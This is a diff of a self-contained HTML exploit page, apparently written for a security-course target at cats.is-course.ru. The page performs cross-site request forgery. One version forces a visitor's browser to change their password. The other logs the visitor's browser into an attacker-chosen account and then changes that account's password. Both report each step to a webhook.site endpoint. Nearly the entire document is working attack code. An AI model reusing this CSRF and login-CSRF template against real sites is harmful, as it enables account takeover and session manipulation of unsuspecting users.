@@ -1,20 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="f" action="https://cats.is-course.ru/settings" method="POST">
-  <input type="hidden" name="password" value="Hacked1234!@">
-  <input type="hidden" name="confirm-password" value="Hacked1234!@">
+<form id="login" action="https://cats.is-course.ru/login" method="POST" target="_self">
+  <input type="hidden" name="login" value="hhroqyrsarwm">
+  <input type="hidden" name="password" value="OriginTest1234!@">
 </form>
 <script>
 var wh='https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8';
-fetch(wh+'?step=loaded',{mode:'no-cors'});
-var fd=new FormData();
-fd.append('password','Hacked1234!@');
-fd.append('confirm-password','Hacked1234!@');
-fetch('https://cats.is-course.ru/settings',{method:'POST',body:fd,credentials:'include',mode:'no-cors'})
- .then(function(){fetch(wh+'?step=fetch_done',{mode:'no-cors'});})
- .catch(function(e){fetch(wh+'?step=fetch_err',{mode:'no-cors'});})
- .finally(function(){setTimeout(function(){document.getElementById('f').submit();},500);});
+fetch(wh+'?v4=loaded',{mode:'no-cors'});
+// step 1: login as my user in bot browser
+var fd1=new FormData(); fd1.append('login','hhroqyrsarwm'); fd1.append('password','OriginTest1234!@');
+fetch('https://cats.is-course.ru/login',{method:'POST',body:fd1,credentials:'include',mode:'no-cors'})
+.catch(function(){})
+.finally(function(){
+  fetch(wh+'?v4=loginposted',{mode:'no-cors'});
+  // step 2: change that user's password
+  var fd2=new FormData(); fd2.append('password','BotChanged1234!@'); fd2.append('confirm-password','BotChanged1234!@');
+  fetch('https://cats.is-course.ru/settings',{method:'POST',body:fd2,credentials:'include',mode:'no-cors'})
+  .catch(function(){})
+  .finally(function(){ fetch(wh+'?v4=setposted',{mode:'no-cors'}); });
+});
 </script>
 </body>
 </html>
